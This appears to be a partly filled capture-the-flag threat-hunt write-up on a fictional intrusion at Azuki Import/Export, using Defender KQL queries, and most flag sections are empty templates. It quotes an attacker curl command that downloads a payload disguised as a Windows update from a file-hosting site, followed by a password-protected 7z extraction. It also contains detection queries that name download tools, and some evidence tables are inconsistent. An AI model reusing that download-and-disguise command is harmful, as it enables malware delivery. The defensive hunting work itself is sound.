<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/00b0fdb0-0f68-4b68-bb47-c01e537193ca" />



# 🚩 INCIDENT BRIEF - Cargo Hold - Azuki Import/Export - 梓貿易株式会社

**📋 INCIDENT BRIEF**

**SITUATION**  
Five days after the file server breach, threat actors returned with sophisticated tools and techniques. The attacker pivoted from the compromised workstation to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data including financial records and password databases.

**COMPROMISED SYSTEMS**  
[REDACTED - Investigation Required]

**EVIDENCE AVAILABLE**  
Microsoft Defender for Endpoint logs

**Query Starting Point**
Starting Point: Nov-24

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
```

## Hunt Overview
[Brief description of the scenario, objective, and key findings. Keep it 2-3 sentences for quick read.]

| Flag | Technique | MITRE ID | Priority |
|------|-----------|----------|----------|
| 1    | [Technique] | [ID] | Critical |
| 2    | [Technique] | [ID] | High |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
| ...  | ... | ... | ... |
---





### 🚩 Flag #1: LATERAL MOVEMENT - Source System
**🎯 Objective**  
Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.

**📌 Finding**  
10.1.0.204

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                              |
| Timestamp        | Nov 25, 2025 1:09:18 PM                    |
| Process          | svchost.exe                                |
| Parent Process   | services.exe                               |
| Command Line     | 'svchost.exe -k netsvcs -p`                |

**💡 Why it matters**  
The IP 10.1.0.204 corresponds to the source system (azuki-adminpc) from which the attacker initiated lateral movement toward higher-value targets.
Identifying the exact pivot point is essential because it shows how the attacker is progressing through the network — moving from the initial beachhead to systems with greater access or data.
This allows defenders to fully scope the compromise, trace all activity originating from that machine, and prioritize containment (e.g., isolating azuki-adminpc).
In real incidents, spotting the lateral movement source early is a high-signal indicator of active escalation and helps prevent deeper damage (MITRE ATT&CK T1021 – Remote Services used for lateral movement).

**🔧 KQL Query Used**
```
DeviceLogonEvents
| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName contains "azuki"
| where LogonType contains "remote"
| order by Timestamp desc

```
**🖼️ Screenshot**
<img width="1717" height="661" alt="image" src="https://github.com/user-attachments/assets/3655d3a4-3179-48a4-b251-546beead9dfb" />


**🛠️ Detection Recommendation**
```
DeviceNetworkEvents
| where TimeStamp> ago(30d)                          // Adjust time window as needed
| where isnotempty(RemoteIP)                              // Only connections with a remote IP
| where LocalIP has "10." or LocalIP has "192.168." or LocalIP has "172."  // Focus on internal/private IP ranges
| summarize ConnectionCount = count(), Targets = make_set(RemoteIP) by LocalIP, DeviceName
| where ConnectionCount > 5                                // Threshold for unusual outbound connectivity (adjust based on baseline)
| order by ConnectionCount desc
```



<br>
<hr>
<br>


### 🚩 Flag #2: LATERAL MOVEMENT - Compromised Credentials
**🎯 Objective**  
Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities.

**📌 Finding**  
yuki.tanaka

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                              |
| Timestamp        | Nov 25, 2025 1:09:18 PM                    |
| Process          | svchost.exe                                |
| Parent Process   | services.exe                               |
| Command Line     | 'svchost.exe -k netsvcs -p`                |

**💡 Why it matters**  
The account yuki.tanaka is the credential the attacker reused to perform lateral movement from the initially compromised system.
Identifying the exact compromised account is vital because it defines the "blast radius" — everything that account can access across the network, including sensitive servers and data.
This knowledge allows defenders to prioritize credential resets, disable the account if needed, and review all its activity to map the full extent of the breach.
In real incidents, attackers frequently reuse stolen valid accounts for lateral movement because they blend in with normal activity and bypass many defenses (MITRE ATT&CK T1078 – Valid Accounts).

**🔧 KQL Query Used**
```
DeviceLogonEvents
| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName contains "azuki"
| where LogonType contains "remote"
| order by Timestamp desc
```
**🖼️ Screenshot**<br>
<br>
<img width="498" height="810" alt="image" src="https://github.com/user-attachments/assets/3d0c7a2a-de6b-452a-a0f1-00b1c5b7f781" />


**🛠️ Detection Recommendation**
```
DeviceLogonEvents
| where Timestamp > ago(30d)                              // Use Timestamp for DeviceLogonEvents
| where LogonType in ("RemoteInteractive", "Network")     // Common for lateral movement
| where isnotempty(RemoteIP)
| where AccountName !contains "$"                         // Exclude machine accounts
| extend IsInternalIP = RemoteIP startswith "10." or RemoteIP startswith "192.168." or (RemoteIP startswith "172." and toint(split(RemoteIP, ".")[1]) >= 16 and toint(split(RemoteIP, ".")[1]) <= 31)
| summarize LogonCount = count(), 
            Devices = make_set(DeviceName), 
            SourceIPs = make_set(RemoteIP),
            InternalLogons = countif(IsInternalIP == true)
            by AccountName
| extend DeviceCount = array_length(Devices)
| project AccountName, LogonCount, DeviceCount, InternalLogons, Devices, SourceIPs
| order by InternalLogons desc, DeviceCount desc, LogonCount desc
```


<br>
<hr>
<br>

### 🚩 Flag #3: LATERAL MOVEMENT - Target Device
**🎯 Objective**  
Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.

**📌 Finding**  
azuki-adminpc

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                              |
| Timestamp        | Nov 25, 2025 1:09:18 PM                    |
| Process          | svchost.exe                                |
| Parent Process   | services.exe                               |
| Command Line     | 'svchost.exe -k netsvcs -p`                |

**💡 Why it matters**  
The device azuki-adminpc is the high-value target the attacker successfully reached through lateral movement.
Its name ("adminpc") and role suggest it belongs to an administrator or executive, meaning it likely has elevated privileges, access to sensitive systems, and valuable data.
Identifying this target device early shows the attacker is no longer limited to the initial compromised machine — they now control a system with much greater potential for damage, such as domain admin rights or confidential files.
Knowing the exact compromised target allows defenders to prioritize isolation, forensic analysis, and containment on that machine before the attacker goes further (MITRE ATT&CK T1021 – Remote Services combined with T1082 – System Information Discovery to select high-value assets).

**🔧 KQL Query Used**
```
DeviceLogonEvents
| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName contains "azuki"
| where LogonType contains "remote"
| order by Timestamp desc
```
**🖼️ Screenshot**
<img width="498" height="810" alt="image" src="https://github.com/user-attachments/assets/3d0c7a2a-de6b-452a-a0f1-00b1c5b7f781" />

**🛠️ Detection Recommendation**
```
DeviceLogonEvents
| where Timestamp > ago(30d)                              // Adjust time window as needed
| where LogonType in ("RemoteInteractive", "Network")     // RDP or network logons – common for lateral movement
| where isnotempty(RemoteIP)                              // Only remote logons
| extend IsInternalSource = RemoteIP startswith "10." or RemoteIP startswith "192.168." or (RemoteIP startswith "172." and toint(split(RemoteIP, ".")[1]) >= 16 and toint(split(RemoteIP, ".")[1]) <= 31)
| where IsInternalSource == true                           // Focus on logons from internal IPs (lateral signal)
| summarize LogonCount = count(), SourceIPs = make_set(RemoteIP) by DeviceName
| project DeviceName, LogonCount, SourceIPs
| order by LogonCount desc
```


<br>
<hr>
<br>



### 🚩 Flag #4: EXECUTION - Payload Hosting Service
**🎯 Objective**  
Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.

**📌 Finding**  
litter.catbox.moe

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                         |
| Timestamp        | Nov 25, 2025 11:21:12 AM            |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | curl.exe                     |
| Command Line     | "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z           |

**💡 Why it matters**  
The attacker used an external file hosting service (different from the one in CTF 2) to stage and download malware payloads onto the compromised system.
This rotation of hosting infrastructure is a common tactic to evade detection — using temporary or lesser-known file sharing sites makes it harder for security tools to block or flag the downloads in advance.
Identifying the specific hosting service is important because it reveals the attacker's current staging location, helps block it at the network level, and can be shared with threat intel feeds to protect other organizations (MITRE ATT&CK T1608.001 – Stage Capabilities).

**🔧 KQL Query Used**
This KQL is an attempt at me to learn new things with AI as a teacher so I can't take full credit for this but it was my idea to search the filename for keywords that led to finding the artifact.
```
DeviceNetworkEvents
| where Timestamp between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName contains "azuki"
| where RemotePort in (80, 443)
| where RemoteIPType == "Public"
| where isnotempty(RemoteUrl)
| extend Host = iff(RemoteUrl contains "://", tostring(split(split(RemoteUrl, "://")[1], "/")[0]), tostring(split(RemoteUrl, "/")[0]))  // Robust extraction
| where Host !contains "microsoft" and Host !contains "azure" and Host !contains "cloudapp" and Host !contains "wns" and Host !contains "windowsupdate"
| where RemoteUrl has_any(".exe", ".zip", ".ps1", ".dll", ".bin", ".sh") or InitiatingProcessFileName has_any("powershell", "python", "curl", "wget")
| project Timestamp, DeviceName, RemoteUrl, Host, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```
**🖼️ Screenshot**
<img width="1782" height="201" alt="image" src="https://github.com/user-attachments/assets/19e1f965-a479-4a8c-90e1-34c752970e37" />


**🛠️ Detection Recommendation**
```
DeviceNetworkEvents
| where Timestamp > ago(30d)                              // Adjust time window as needed
| where RemotePort in (80, 443)
| where RemoteIPType == "Public"
| where isnotempty(RemoteUrl)
| extend Host = tostring(parse_url(RemoteUrl).Host)
| where Host !contains "microsoft" and Host !contains "azure" and Host !contains "windowsupdate" and Host !contains "akamai"
| where InitiatingProcessFileName in ("powershell.exe", "curl.exe", "certutil.exe", "bitsadmin.exe", "wget.exe")
| where RemoteUrl has_any(".exe", ".zip", ".7z", ".ps1", ".dll", ".bin", ".tar")
| project Timestamp, DeviceName, RemoteUrl, Host, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
```


### 🚩 Flag #5: EXECUTION - Malware Download Command
**🎯 Objective**  
Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                         |
| Timestamp        | Nov 25, 2025 11:21:11 AM              |
| Process          | curl.exe                   |
| Parent Process   | explorer.exe                      |
| Command Line     | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`                 |

**💡 Why it matters**  
The attacker used a command-line tool (curl) to directly download a malicious archive disguised as a legitimate Windows update (KB5044273-x64.7z).
This technique lets attackers quickly pull payloads from external hosting sites while blending in with normal admin or update activity.
Spotting these scripted downloads early is key because they are often the moment malware first lands on the system, enabling everything that follows (MITRE ATT&CK T1105 – Ingress Tool Transfer).

**🔧 KQL Query Used**
```
DeviceProcessEvents
| where Timestamp between (startofday(date(2025-11-24)) .. endofday(date(2025-11-25)))
| where DeviceName has "azuki"
| where ProcessCommandLine  has_any("powershell", "python", "curl", "wget", "certutil")
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc 
```
**🖼️ Screenshot**
<img width="1733" height="563" alt="image" src="https://github.com/user-attachments/assets/4c6273f0-42c1-4ccc-a224-317e7a8af9e4" />


**🛠️ Detection Recommendation**
```
DeviceProcessEvents
| where Timestamp > ago(30d)                              // Adjust time window as needed
| where FileName in ("curl.exe", "wget.exe", "bitsadmin.exe", "certutil.exe", "powershell.exe")
| where ProcessCommandLine has_any("-o ", "/o ", "-out", "OutFile", "download", "Invoke-WebRequest", "Start-BitsTransfer", "certutil -urlcache")
| where ProcessCommandLine has_any("http://", "https://", ".exe", ".zip", ".7z", ".ps1", ".dll")
| project Timestamp, DeviceName, ProcessCommandLine, FileName, AccountName, InitiatingProcessCommandLine
| order by Timestamp desc
```



<br>
<hr>
<br>


### 🚩 Flag #6: EXECUTION - Archive Extraction Command
**🎯 Objective**  
Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | azuki-adminpc                        |
| Timestamp        | Nov 25, 2025 11:21:32 AM               |
| Process          | 7z.exe                    |
| Parent Process   | Nameexplorer.exe                    |
| Command Line     | "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y                 |

**💡 Why it matters**  
The attacker used a command-line archive extraction tool to unpack the password-protected malicious archive downloaded in the previous flag.
Password-protected archives are a common way to bypass antivirus scans and EDR content inspection, since the payload is hidden until extracted.
Using built-in or legitimate compression tools (like 7-Zip or tar) also helps the attacker blend in, as these are often whitelisted and look like normal admin activity.
Detecting this extraction command is a high-signal indicator that the malware has now been unpacked and is ready to run on the system (MITRE ATT&CK T1140 – Deobfuscate/Decode Files or Information combined with T1105 – Ingress Tool Transfer).

**🔧 KQL Query Used**
```
DeviceProcessEvents
| where Timestamp between (startofday(date(2025-11-24)) .. endofday(date(2025-11-25)))
| where DeviceName has "azuki"
| project Timestamp, DeviceName, FileName, FolderPath, ProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp asc 

```
**🖼️ Screenshot**
<img width="1854" height="443" alt="image" src="https://github.com/user-attachments/assets/16f91eeb-d0c5-40a3-a0cc-00e4b89967ce" />


**🛠️ Detection Recommendation**
```
DeviceProcessEvents
| where Timestamp > ago(30d)                              // Adjust time window as needed
| where FileName in ("7z.exe", "7za.exe", "tar.exe", "winrar.exe", "rar.exe", "unzip.exe", "expand.exe", "powershell.exe")
| where ProcessCommandLine has_any(" -p", "-P", " -password", "extract", " x ", " e ", " -o", "Expand-Archive")
| where ProcessCommandLine has_any(".zip", ".7z", ".rar", ".tar", ".gz")
| project Timestamp, DeviceName, ProcessCommandLine, FileName, AccountName, FolderPath
| order by Timestamp desc
```


<br>
<hr>
<br>

### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


<br>
<hr>
<br>



### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```



<br>
<hr>
<br>


### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


<br>
<hr>
<br>

### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


<br>
<hr>
<br>



### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```



### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```



<br>
<hr>
<br>


### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


<br>
<hr>
<br>

### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```


<br>
<hr>
<br>



### 🚩 Flag # – [Flag Title]
**🎯 Objective**  
[Describe the objective of this flag in 1-2 sentences.]

**📌 Finding**  
[Your finding/answer here, e.g., specific command or artifact.]

**🔍 Evidence**

| Field            | Value                                      |
|------------------|--------------------------------------------|
| Host             | [e.g., victim-vm]                          |
| Timestamp        | [e.g., 2025-12-11T12:00:00Z]               |
| Process          | [e.g., powershell.exe]                     |
| Parent Process   | [e.g., explorer.exe]                       |
| Command Line     | `[Your command line here]`                 |

**💡 Why it matters**  
[Explain the impact, real-world relevance, MITRE mapping, and why this is a high-signal indicator. 4-6 sentences for depth.]

**🔧 KQL Query Used**
```
[Your exact KQL query here]
```
**🖼️ Screenshot**
[Your screenshot here]

**🛠️ Detection Recommendation**
```
[Your exact KQL query here]
```
